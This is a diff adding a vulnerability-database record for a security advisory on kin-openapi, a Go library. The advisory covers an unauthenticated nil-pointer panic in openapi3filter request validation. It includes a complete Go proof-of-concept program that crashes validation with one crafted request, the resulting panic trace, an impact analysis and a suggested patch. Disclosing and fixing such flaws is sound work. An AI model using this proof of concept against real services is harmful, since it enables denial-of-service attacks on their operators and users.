@@ -1,0 +1,232 @@
+[basic]
+description = '''
+| Field | Value |
+|---|---|
+| Ecosystem | Go |
+| Package | `github.com/getkin/kin-openapi` |
+| Affected versions | `<= 0.143.0` (introduced in `v0.2.0`, PR #90, 2019-05-07; reproduced on `HEAD` `30e2923`) |
+| Patched versions | 0.144.0 |
+---
+
+### Summary
+
+`openapi3filter.ValidateRequest` contains a NULL-pointer-dereference denial of service: any **unauthenticated** client can crash the request-validation path with a **single** HTTP request. When an operation declares a `content` parameter (as opposed to a `schema` parameter) whose media type object has **no `schema`**, request validation dereferences that missing schema and panics. The document is legal under the OpenAPI Specification — kin-openapi's own `doc.Validate()` accepts it — and the defect affects **both OpenAPI 3.0.x and 3.1.x**. Depending on how the library is wired into the server (see Impact), this ranges from a per-request abort with unbounded panic-log growth to a full remote process crash.
+
+### Details
+
+The decoder used for `content` parameters when no custom `ParamDecoder` is configured (the library default), `defaultContentParameterDecoder`, dereferences the media-type schema without a nil check.
+
+`openapi3filter/req_resp_decoder.go`, around line 197:
+
+```go
+mt := content.Get(\"application/json\")
+if mt == nil {                       // media-type OBJECT is guarded ...
+    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)
+    return
+}
+outSchema = mt.Schema.Value          // ... but mt.Schema is NOT — panics when nil
+```
+
+The function guards `param.Content == nil`, `len(content) != 1`, and `mt == nil`, but never `mt.Schema == nil`.
+
+**Why a schema-less content parameter is legal** (so the sink is reachable — `doc.Validate()` returns no error), in both 3.0.x and 3.1.x:
+
+- `openapi3/parameter.go` — `Parameter.Validate` only enforces *exactly one of `schema` XOR `content`*; a parameter with `content` (and no `schema`) satisfies it.
+- `openapi3/media_type.go` — `MediaType.Validate` validates the schema **only when it is non-nil**, so an absent schema is not a validation error.
+
+**Call path to the panic:**
+
+```
+ValidateRequest                          openapi3filter/validate_request.go:83
+  └─ ValidateParameter                   openapi3filter/validate_request.go:177   (parameter.Content != nil)
+       └─ decodeContentParameter         openapi3filter/req_resp_decoder.go:166   (attacker supplies value ⇒ found)
+            └─ defaultContentParameterDecoder   openapi3filter/req_resp_decoder.go:197   ← nil deref / panic
+```
+
+**Authentication note:** `ValidateRequest` validates security *before* parameters, but the panic is reachable **without credentials** whenever the target operation declares no security requirement, or when no `AuthenticationFunc` is configured (it is opt-in). A single unauthenticated operation anywhere in the served spec is sufficient. If an operation *does* declare security and a rejecting `AuthenticationFunc` is wired, that request is rejected before decoding.
+
+### PoC
+
+Reproduced end-to-end against `HEAD` (`30e2923`) with a real `net/http` server and a stock `http.Client`.
+
+**1. Minimal OpenAPI 3.0.3 document** (legal — `doc.Validate()` passes). The `cfg` query parameter uses `content` with an `application/json` media type that has **no `schema`**:
+
+```yaml
+openapi: 3.0.3
+info: {title: poc, version: \"1.0.0\"}
+paths:
+  /c:
+    get:
+      parameters:
+        - name: cfg
+          in: query
+          content:
+            application/json: {}      # media type object with NO schema
+      responses:
+        \"200\": {description: ok}
+```
+
+**2. A complete, self-contained program.** Drop this into a directory inside a checkout of `github.com/getkin/kin-openapi` and run it with `go run .`. It loads the document above, asserts `doc.Validate()` accepts it (proving reachability), serves it behind request validation exactly as the recommended middleware does, and sends one unauthenticated `GET /c?cfg=1`:
+
+```go
+package main
+
+import (
+	\"context\"
+	\"fmt\"
+	\"net/http\"
+	\"net/http/httptest\"
+
+	\"github.com/getkin/kin-openapi/openapi3\"
+	\"github.com/getkin/kin-openapi/openapi3filter\"
+	\"github.com/getkin/kin-openapi/routers/gorillamux\"
+)
+
+const spec = `
+openapi: 3.0.3
+info: {title: poc, version: \"1.0.0\"}
+paths:
+  /c:
+    get:
+      parameters:
+        - name: cfg
+          in: query
+          content:
+            application/json: {}      # media type object with NO schema
+      responses:
+        \"200\": {description: ok}
+`
+
+func main() {
+	loader := openapi3.NewLoader()
+	doc, err := loader.LoadFromData([]byte(spec))
+	if err != nil {
+		panic(err)
+	}
+	// Reachability: the malformed-but-legal document must validate.
+	if err := doc.Validate(context.Background()); err != nil {
+		panic(\"doc.Validate rejected the spec, not reachable: \" + err.Error())
+	}
+	router, err := gorillamux.NewRouter(doc)
+	if err != nil {
+		panic(err)
+	}
+
+	// Handler mirrors openapi3filter.ValidationHandler: find route, validate.
+	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		route, pathParams, err := router.FindRoute(r)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusNotFound)
+			return
+		}
+		// Panics here on the crafted request (req_resp_decoder.go:197).
+		if err := openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
+			Request:    r,
+			PathParams: pathParams,
+			Route:      route,
+			Options:    &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
+		}); err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		w.WriteHeader(http.StatusOK)
+	})
+
+	srv := httptest.NewServer(h)
+	defer srv.Close()
+
+	// The single, unauthenticated attack request.
+	resp, err := http.Get(srv.URL + \"/c?cfg=1\")
+	if err != nil {
+		// Expected: the server goroutine panicked, so the client sees EOF.
+		fmt.Printf(\"client received an aborted response (expected): %v\n\", err)
+		return
+	}
+	defer resp.Body.Close()
+	fmt.Printf(\"UNEXPECTED: got HTTP %d without a panic\n\", resp.StatusCode)
+}
+```
+
+**3. Observed result** — the request goroutine panics inside validation, and the client's `http.Get` returns an EOF:
+
+```
+http: panic serving 127.0.0.1:xxxxx: runtime error: invalid memory address or nil pointer dereference
+github.com/getkin/kin-openapi/openapi3filter.defaultContentParameterDecoder(...)
+	openapi3filter/req_resp_decoder.go:197
+github.com/getkin/kin-openapi/openapi3filter.decodeContentParameter(...)
+	openapi3filter/req_resp_decoder.go:166
+github.com/getkin/kin-openapi/openapi3filter.ValidateParameter(...)
+	openapi3filter/validate_request.go:177
+github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
+	openapi3filter/validate_request.go:83
+```
+
+Swapping the media type for one that carries a schema (`application/json: {schema: {type: object}}`) makes the same request return a clean `400` instead of panicking, confirming the missing schema is the cause.
+
+### Impact
+
+This is an **unauthenticated remote denial of service** (CWE-476) against any service that validates incoming requests with `openapi3filter` and serves a spec containing at least one `content` parameter whose media type lacks a `schema`.
+
+The precise consequence depends on which goroutine runs the panic and whether a `recover()` covers it:
+
+| Wiring | Recovered by `net/http`? | Result |
+|---|---|---|
+| Synchronous middleware / handler on `net/http` (incl. `openapi3filter.ValidationHandler`) | Yes | Process survives; the one request is aborted. A remote unauthenticated party can still drive connection churn + unbounded `http: panic serving` log growth. |
+| `ValidateRequest` on an app-spawned goroutine (fan-out, `errgroup`, async pre-check) | No | **Whole process crashes** on a single unauthenticated request unless the app added its own `recover()`. |
+| Non-`net/http` host (fasthttp adaptor, gRPC-gateway shim, CLI, offline/batch spec validator) | No | **Whole process crashes.** |
+
+This is why the suggested CVSS uses `A:L` (Base 5.3): under the recommended synchronous `net/http` wiring the panic is recovered per-connection. Reviewers may reasonably raise it to `A:H` (Base 7.5) for the spawned-goroutine and non-`net/http` integrations, where a single request kills the process.
+
+---
+
+## Remediation (suggested)
+
+Add a `mt.Schema == nil` guard mirroring the existing `mt == nil` guard, so a schema-less content parameter yields a clean validation error instead of a panic:
+
+```go
+mt := content.Get(\"application/json\")
+if mt == nil {
+    err = fmt.Errorf(\"parameter %q has no content schema\", param.Name)
+    return
+}
+if mt.Schema == nil {
+    err = fmt.Errorf(\"parameter %q content media type has no schema\", param.Name)
+    return
+}
+outSchema = mt.Schema.Value
+```
+
+The `unmarshal` closure immediately below already tolerates a nil schema (it checks `paramSchema != nil`), so returning early on nil `mt.Schema` is consistent with surrounding intent.
+
+**Workarounds for consumers, pending a patch:**
+
+- Ensure every `content` parameter in served specs declares a `schema`, or reject such specs at load time.
+- Supply a custom `ParamDecoder` that guards `mt.Schema == nil`.
+- Run request validation inside a handler with an explicit `recover()` — especially if validation runs off the request goroutine or on a non-`net/http` host.
+
+## Notes for the maintainer
+
+This root cause (`mt.Schema == nil`) is independent of the `Items == nil` panics addressed in `30e2923` and of `GHSA-mmfr-pmjx-hw9w`; no prior fix touched this code path. It affects OpenAPI 3.0.x as well as 3.1.x.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "kin-openapi openapi3filter: unauthenticated nil-pointer panic when validating a request against a `content` parameter whose media type has no schema"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-jpcw-4wr7-c3vq"]
+ave_id = "AVE-2026-1142"
+
+[meta]
+collected_at = "2026-08-06T07:04:51.937525197+00:00"
+status = "completed"
+
+[references]
+urls = []
